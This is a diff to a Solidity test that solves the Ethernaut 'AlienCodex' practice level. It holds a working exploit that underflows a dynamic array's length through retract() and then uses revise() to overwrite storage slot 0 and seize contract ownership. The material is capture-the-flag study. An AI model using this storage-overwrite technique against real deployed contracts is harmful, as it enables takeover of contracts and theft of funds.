@@ -15,7 +15,7 @@ contract AlienCodexTest is DSTest {
         ethernaut = new Ethernaut();
     }
 
-    function testAlienCodexHack() public {
+    function testAlienCodexAttack() public {
         /////////////////
         // LEVEL SETUP //
         /////////////////
@@ -34,14 +34,18 @@ contract AlienCodexTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
+        bool success;
+        bytes memory data;
+
         // Make contract first to set contact to true and pass the modifier checks of other functions
-        alienCodex.call(abi.encodeWithSignature("make_contact()"));
+        (success, data) = alienCodex.call(abi.encodeWithSignature("make_contact()"));
+        require(success);
 
-        // all of contract storage is a 32 bytes key to 32 bytes value mapping
-        // first make codex expand its size to cover all of this storage
-        // by calling retract making it overflow
-        alienCodex.call(abi.encodeWithSignature("retract()"));
-
+        // All of contract storage is a 32 bytes key to 32 bytes value mapping
+        // First make codex expand its size to cover all of this storage
+        // By calling retract making it overflow
+        (success, data) = alienCodex.call(abi.encodeWithSignature("retract()"));
+        require(success);
 
         /*
         * alienCodex storage slot 0 is [ 0 padding, bool contact (1byte), address owner (20 bytes)]
@@ -55,8 +59,6 @@ contract AlienCodexTest is DSTest {
         * And we can further optimize it by using the fact that 2**256 = 0 because it overflows.
         */
 
-        // alienCodex.revise(0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a, bytes32(uint256(address(tx.origin))));
-
         // Compute codex index corresponding to slot 0
         uint256 codexIndexForSlotZero;
     unchecked {
@@ -68,20 +70,24 @@ contract AlienCodexTest is DSTest {
 
         // must be uint256 in function signature not uint
         // call revise with codex index and content which will set you as the owner
-        alienCodex.call(abi.encodeWithSignature("revise(uint256,bytes32)", codexIndexForSlotZero, leftPaddedAddress));
-
+        (success, data) = alienCodex.call(abi.encodeWithSignature("revise(uint256,bytes32)", codexIndexForSlotZero, leftPaddedAddress));
+        require(success);
 
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
 
-        (bool success, bytes memory data) = alienCodex.call(abi.encodeWithSignature("owner()"));
+        (success, data) = alienCodex.call(abi.encodeWithSignature("owner()"));
         require(success);
 
-        // data is of type bytes32 so the address is padded, byte manipulation to get address
-        address refinedData = address(uint160(bytes20(uint160(uint256(bytes32(data)) << 0))));
+        // Either decode returned data or use an inline assembly mload to get the address
+        (address addr) = abi.decode(data, (address));
+        // address addr;
+        // assembly {
+        //     addr := mload(add(data,0x20))
+        // }
 
         vm.stopPrank();
-        assertEq(refinedData, tx.origin);
+        assertEq(addr, tx.origin);
     }
 }
